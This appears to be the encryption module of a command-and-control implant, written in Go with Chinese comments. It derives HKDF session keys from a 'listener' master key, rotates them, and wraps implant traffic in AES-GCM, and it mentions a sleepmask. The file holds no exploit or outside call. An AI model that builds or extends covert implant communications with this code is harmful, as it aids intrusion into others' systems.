package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"sync"
	"time"

	"golang.org/x/crypto/hkdf"
	"implant/core/config"
	"implant/core/debuglog"
)

// sessionKeyInfo HKDF 会话密钥派生盐上下文(固定,与服务端 pkg/encrypt/encrypt.go 完全一致;不得用随机 masquerade 前缀)
// 会话密钥派生盐上下文来自配置占位符(服务端 security.session_key_info patch,两端一致)

// masterKey 监听器主密钥（由 SetSessionKey 注入；用于 MetaInfo 等 FirstBlood 前传输的 AES-GCM 加密）。
// 【加密体系改造】旧加密（AES-CFB 密钥前置明文）已移除——截获即解密；统一 AES-GCM。
var globalMasterKey []byte

// globalSalt 监听器加密盐（SetSessionKey 注入；会话密钥唯一化重派生用）
var globalSalt []byte

// SetMasterKey 注入监听器主密钥（app.Init 时调用；MetaInfo 等 FirstBlood 前传输的 AES-GCM 加密用）
func SetMasterKey(masterKey []byte) {
	if len(masterKey) >= 32 {
		mk := make([]byte, 32)
		copy(mk, masterKey[:32])
		globalMasterKey = mk
	}
}

// getMasterKey 返回监听器主密钥（未注入时返回 nil）
func getMasterKey() []byte { return globalMasterKey }

// EncryptWithMasterKey 用监听器主密钥 AES-GCM 加密（MetaInfo 传输等）。
// 格式: nonce(12) | GCM 密文。主密钥来自二进制 patch 的占位符，服务端持同一密钥。
func EncryptWithMasterKey(data []byte) ([]byte, error) {
	mk := getMasterKey()
	if len(mk) < 32 {
		return nil, errors.New("主密钥未初始化")
	}
	gcm, err := getAEAD(mk)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	out := gcm.Seal(nonce, nonce, data, nil)
	return out, nil
}

// DecryptWithMasterKey 用监听器主密钥 AES-GCM 解密（MetaInfo 传输等）
func DecryptWithMasterKey(data []byte) ([]byte, error) {
	mk := getMasterKey()
	if len(mk) < 32 {
		return nil, errors.New("主密钥未初始化")
	}
	gcm, err := getAEAD(mk)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, errors.New("密文过短")
	}
	nonce := data[:gcm.NonceSize()]
	ciphertext := data[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// EncryptWithMasterKeyRaw 用指定主密钥加密（供服务端按监听器密钥解密；客户端一般用全局注入）
func EncryptWithMasterKeyRaw(data, masterKey []byte) ([]byte, error) {
	if len(masterKey) < 32 {
		return nil, errors.New("主密钥无效")
	}
	gcm, err := getAEAD(masterKey)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, data, nil), nil
}

// DecryptWithMasterKeyRaw 用指定主密钥解密
func DecryptWithMasterKeyRaw(data, masterKey []byte) ([]byte, error) {
	if len(masterKey) < 32 {
		return nil, errors.New("主密钥无效")
	}
	gcm, err := getAEAD(masterKey)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, errors.New("密文过短")
	}
	return gcm.Open(nil, data[:gcm.NonceSize()], data[gcm.NonceSize():], nil)
}

// EncodeBase64 将 []byte 编码为 Base64 并返回 []byte
func EncodeBase64(data []byte) ([]byte, error) {
	encodedString := base64.StdEncoding.EncodeToString(data)
	return []byte(encodedString), nil
}

// DecodeBase64 将 Base64 编码的 []byte 解码回原始的 []byte
func DecodeBase64(encodedData []byte) ([]byte, error) {
	decodedData, err := base64.StdEncoding.DecodeString(string(encodedData))
	if err != nil {
		return nil, err
	}
	return decodedData, nil
}

// ClientKeyManager 客户端密钥管理器
type ClientKeyManager struct {
	clientID    string
	sessionKey  []byte
	previousKey []byte // P3-1: 轮换前的旧密钥（重叠期内仍用于解密服务端轮换确认前的消息）
	keyVersion  int
	keyID       string
	createdAt   time.Time
	expiresAt   time.Time
	mu          sync.RWMutex
}

// GlobalClientKeyManager 全局客户端密钥管理器
var GlobalClientKeyManager *ClientKeyManager

// InitClientKeyManager 初始化客户端密钥管理器
func InitClientKeyManager(clientID string) {
	GlobalClientKeyManager = &ClientKeyManager{
		clientID: clientID,
	}
}

// SetSessionKey 设置会话密钥
func (ckm *ClientKeyManager) SetSessionKey(salt []byte, masterKey []byte) error {
	ckm.mu.Lock()
	defer ckm.mu.Unlock()

	// 注入监听器主密钥与盐（MetaInfo 传输加密 + 会话密钥唯一化重派生用）
	if len(masterKey) >= 32 {
		mk := make([]byte, 32)
		copy(mk, masterKey[:32])
		globalMasterKey = mk
	}
	if len(salt) >= 16 {
		sl := make([]byte, 16)
		copy(sl, salt[:16])
		globalSalt = sl
	}

	// 使用 HKDF 派生会话密钥
	hkdf := hkdf.New(sha256.New, masterKey, salt, []byte(config.SessionKeyInfo()+ckm.clientID))
	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdf, sessionKey); err != nil {
		return fmt.Errorf("派生会话密钥失败: %v", err)
	}

	// 生成确定性密钥ID（与服务端保持一致）
	keyIDInput := ckm.clientID + "_session_" + string(salt)
	hasher := md5.New()
	hasher.Write([]byte(keyIDInput))
	keyIDBytes := hasher.Sum(nil)
	keyID := hex.EncodeToString(keyIDBytes[:8]) // 使用前8字节

	ckm.sessionKey = sessionKey
	ckm.keyVersion++
	ckm.keyID = keyID
	ckm.createdAt = time.Now()
	ckm.expiresAt = time.Now().Add(24 * time.Hour)

	debuglog.Printf("🔑 [CLIENT] 会话密钥设置成功: KeyID=%s, Version=%d\n", keyID, ckm.keyVersion)
	return nil
}

// SetSessionKeyWithNonce 会话密钥唯一化：用服务端下发的每连接随机 nonce 重派生会话密钥。
// 原实现同一监听器所有客户端共享同一把 HKDF 密钥；加入 nonce 后每会话唯一。
// 使用 SetSessionKey 缓存的 masterKey/salt。
// P3-1: 同时服务于密钥轮换（服务端下发 type=5|nonce，客户端以同一 nonce 重派生）；
// 旧密钥降为 previousKey（重叠期内仍可解密服务端轮换确认前用旧密钥加密的消息）。
func (ckm *ClientKeyManager) SetSessionKeyWithNonce(nonce []byte) error {
	ckm.mu.Lock()
	defer ckm.mu.Unlock()

	if len(globalMasterKey) < 32 || len(globalSalt) < 16 {
		return errors.New("监听器主密钥/盐未初始化")
	}

	hk := hkdf.New(sha256.New, globalMasterKey, globalSalt, []byte(config.SessionKeyInfo()+ckm.clientID+string(nonce)))
	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hk, sessionKey); err != nil {
		return fmt.Errorf("派生会话密钥失败: %v", err)
	}

	// 旧密钥保留为 previousKey（轮换/唯一化后的重叠期解密）
	if ckm.sessionKey != nil {
		ckm.previousKey = append([]byte{}, ckm.sessionKey...)
	}
	ckm.sessionKey = sessionKey
	ckm.keyVersion++
	ckm.keyID = fmt.Sprintf("%s-n%d", ckm.keyID, ckm.keyVersion)
	ckm.createdAt = time.Now()
	ckm.expiresAt = time.Now().Add(24 * time.Hour)

	debuglog.Printf("🔑 [CLIENT] 会话密钥唯一化完成: KeyID=%s, Version=%d\n", ckm.keyID, ckm.keyVersion)
	return nil
}

// SetSessionKeyRotate 密钥轮换（P3-1）：用服务端下发的轮换 nonce 重派生，
// 与 SetSessionKeyWithNonce 同公式（服务端以同输入派生 NextKey）。轮换语义上
// 保持唯一化体系：每次轮换随机 nonce，密钥仍每会话唯一。
func (ckm *ClientKeyManager) SetSessionKeyRotate(nonce []byte) error {
	return ckm.SetSessionKeyWithNonce(nonce)
}

// GetSessionKey 获取会话密钥
func (ckm *ClientKeyManager) GetSessionKey() ([]byte, error) {
	ckm.mu.RLock()
	defer ckm.mu.RUnlock()

	if ckm.sessionKey == nil {
		return nil, errors.New("会话密钥未初始化")
	}

	if time.Now().After(ckm.expiresAt) {
		return nil, errors.New("会话密钥已过期")
	}

	// 返回拷贝：调用方（如 sleepmask 就地 XOR）不得污染全局会话密钥
	keyCopy := make([]byte, len(ckm.sessionKey))
	copy(keyCopy, ckm.sessionKey)
	return keyCopy, nil
}

// aeadCache 按密钥缓存 cipher.AEAD。aes.NewCipher（含 key schedule）+ cipher.NewGCM（含 GHASH
// 初始化）开销大，而会话密钥稳定，应复用。键为 key 字节序列的 string 视图。
var aeadCache sync.Map

// aeadCacheMaxEntries 缓存条目上限：会话密钥 24h 轮换/重连变体下，
// 无上限时长期运行内存缓慢增长；超过上限清空重建（重建代价为一次密钥调度）。
const aeadCacheMaxEntries = 16

// aeadCacheLen 统计缓存条目数（仅 miss 路径调用，频率低）
func aeadCacheLen() int {
	n := 0
	aeadCache.Range(func(_, _ interface{}) bool { n++; return true })
	return n
}

// getAEAD 取（必要时构建并缓存）指定密钥的 AES-GCM AEAD。
func getAEAD(key []byte) (cipher.AEAD, error) {
	k := string(key)
	if v, ok := aeadCache.Load(k); ok {
		return v.(cipher.AEAD), nil
	}
	// 【优化】超限清空，防止历史轮换密钥的 GCM 实例无界累积
	if aeadCacheLen() >= aeadCacheMaxEntries {
		aeadCache.Range(func(kk, _ interface{}) bool { aeadCache.Delete(kk); return true })
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("创建密码块失败: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建 GCM 失败: %v", err)
	}
	aeadCache.Store(k, gcm)
	return gcm, nil
}

// SecureEncrypt 使用 AES-GCM 进行安全加密
func SecureEncrypt(data []byte, key []byte) ([]byte, error) {
	gcm, err := getAEAD(key)
	if err != nil {
		return nil, err
	}

	// 生成随机 nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("生成 nonce 失败: %v", err)
	}

	// 加密数据
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

// SecureDecrypt 使用 AES-GCM 进行安全解密
func SecureDecrypt(ciphertext []byte, key []byte) ([]byte, error) {
	gcm, err := getAEAD(key)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("密文太短")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	// 解密数据
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("解密失败: %v", err)
	}

	return plaintext, nil
}

// EncryptWithSessionKey 使用会话密钥加密
func EncryptWithSessionKey(data []byte) ([]byte, error) {
	if GlobalClientKeyManager == nil {
		return nil, errors.New("客户端密钥管理器未初始化")
	}

	// 【加密体系改造】会话密钥缺失/加密失败直接报错，不再回落旧加密
	sessionKey, err := GlobalClientKeyManager.GetSessionKey()
	if err != nil {
		return nil, err
	}
	return SecureEncrypt(data, sessionKey)
}

// DecryptWithSessionKey 使用会话密钥解密（P3-1: 轮换重叠期先试当前密钥，
// 失败再试 previousKey——服务端确认轮换前仍用旧密钥加密命令）
func DecryptWithSessionKey(ciphertext []byte) ([]byte, error) {
	if GlobalClientKeyManager == nil {
		return nil, errors.New("客户端密钥管理器未初始化")
	}

	ckm := GlobalClientKeyManager
	ckm.mu.RLock()
	cur := ckm.sessionKey
	prev := ckm.previousKey
	ckm.mu.RUnlock()

	if len(cur) == 0 {
		return nil, errors.New("会话密钥未初始化")
	}
	plaintext, err := SecureDecrypt(ciphertext, cur)
	if err == nil {
		return plaintext, nil
	}
	// 轮换重叠期：旧密钥仍可解密服务端在确认前下发的消息
	if len(prev) > 0 {
		return SecureDecrypt(ciphertext, prev)
	}
	return nil, err
}

// BytesToMD5 计算字节数组的 MD5 哈希值
func BytesToMD5(s []byte) string {
	// 创建一个新的 MD5 哈希对象
	hasher := md5.New()

	// 将字符串写入哈希对象
	hasher.Write(s)

	// 获取哈希值的字节切片
	md5Bytes := hasher.Sum(nil)

	// 将字节切片转换为十六进制字符串
	return fmt.Sprintf("%x", md5Bytes)
}
